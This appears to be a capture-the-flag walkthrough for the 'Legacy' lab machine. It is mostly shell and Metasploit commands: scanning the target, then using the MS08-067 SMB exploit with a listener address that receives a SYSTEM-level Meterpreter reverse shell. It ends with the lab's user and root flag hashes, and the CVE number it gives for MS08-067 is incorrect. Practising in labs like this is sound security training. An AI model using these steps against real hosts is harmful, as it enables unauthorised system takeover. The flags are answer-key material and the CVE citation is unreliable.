# Legacy - Easy

```shell
rustscan -a 10.10.10.4 --range 0-65535 --ulimit 5000 -- -sV

nmap -T4 -p 445 --script vuln 10.10.10.4

msfconsole -q

search MS08-067

use exploit/windows/smb/ms08_067_netapi

options

set RHOSTS 10.10.10.4

set LHOST 10.10.14.7

run
#we get meterpreter shell

getuid
#SYSTEM user

#search and get user and root flags
search -f user.txt

search -f root.txt
```

```markdown
Open ports & services:

  * 135 - msrpc
  * 139 - netbios-ssn
  * 445 - microsoft-ds

We can check for any vulnerabilities in the Samba service (port 445) using nmap.

As a result, we find out that the system is vulnerable to RCE (MS08-067), CVE-2008-4520

We fire up Metasploit and search for this exploit and select it.

By running the exploit, we get a Meterpreter shell as SYSTEM user, so we can get both flags.
```

1. User flag - e69af0e4f443de7e36876fda4ec7644f

2. Root flag - 993442d258b0e0ec917cae9e695d5713
